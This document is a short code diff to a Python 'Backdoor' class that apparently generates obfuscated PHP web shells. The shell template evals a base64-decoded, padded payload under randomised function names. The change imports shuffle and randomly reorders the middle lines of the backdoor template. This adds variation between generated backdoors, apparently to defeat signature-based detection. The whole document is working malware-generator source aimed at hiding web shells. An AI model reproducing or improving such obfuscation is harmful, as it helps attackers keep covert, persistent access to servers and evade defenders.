@@ -17,7 +17,7 @@
 # or write to the Free Software Foundation, Inc.,
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 import base64, codecs
-from random import random, randrange, choice
+from random import random, randrange, choice, shuffle
 
 class Backdoor:
 #	payload_template_old= """
@@ -121,6 +121,12 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 		piece1	= length / 4 + randrange(-offset,+offset)
 		piece2  = length / 2 + randrange(-offset,+offset)
 		piece3  = length*3/4 + randrange(-offset,+offset)
+		
+		ts_splitted = self.backdoor_template.splitlines()
+		ts_shuffled = ts_splitted[1:-3]
+		shuffle(ts_shuffled)
+		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[-3:]
+		self.backdoor_template = '\n'.join(ts_splitted)
 		
 		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
 		template = template.replace( '%%B64_FUNC%%', b64_new_func_name )
